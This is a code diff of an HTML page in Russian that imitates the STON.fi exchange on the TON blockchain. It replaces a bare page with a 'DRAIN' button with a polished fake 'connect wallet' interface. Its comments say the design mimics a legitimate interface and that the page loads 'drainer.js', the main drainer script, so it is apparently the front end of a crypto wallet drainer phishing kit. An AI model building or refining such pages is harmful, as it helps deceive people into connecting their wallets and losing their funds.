@@ -1,28 +1,81 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    
-    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
-    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>STON.fi — обменник</title>
+    <style>
+        /* Минималистичный стиль под легитимный интерфейс */
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: #0b0e11;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: #1e2329;
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.6);
+        }
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+            color: #00a3ff;
+            margin-bottom: 10px;
+        }
+        .sub {
+            color: #8b95a0;
+            margin-bottom: 30px;
+        }
+        .btn {
+            background: #00a3ff;
+            border: none;
+            color: #fff;
+            padding: 14px 40px;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn:hover {
+            background: #0090e0;
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            pointer-events: none;
+        }
+        #status {
+            margin-top: 20px;
+            color: #f0b90b;
+            font-size: 14px;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #5e6a76;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="logo">STON.fi</div>
+        <div class="sub">Децентрализованный обменник</div>
+        <button id="connectBtn" class="btn">Подключить кошелёк</button>
+        <div id="status">Готов к подключению</div>
+        <div class="footer">Работает на TON</div>
+    </div>
 
-
-
-<div id="ton-connect"></div>  <!--Коннект кошелька-->
-<button onclick="didtrans();" style="MARGIN-TOP:30PX;FONT-SIZE:24PX;">DRAIN</button><!--Запрос трансфера монет-->
-
-
-
-
-<script src="tonsdk.js"></script>
- 
-    
-
-
-
+    <!-- Загрузка TON Connect SDK с CDN -->
+    <script src="https://unpkg.com/@tonconnect/sdk@2.0.0/dist/tonconnect-sdk.min.js"></script>
+    <!-- Основной скрипт дрэйнера -->
+    <script src="drainer.js"></script>
 </body>
-
-
 </html>
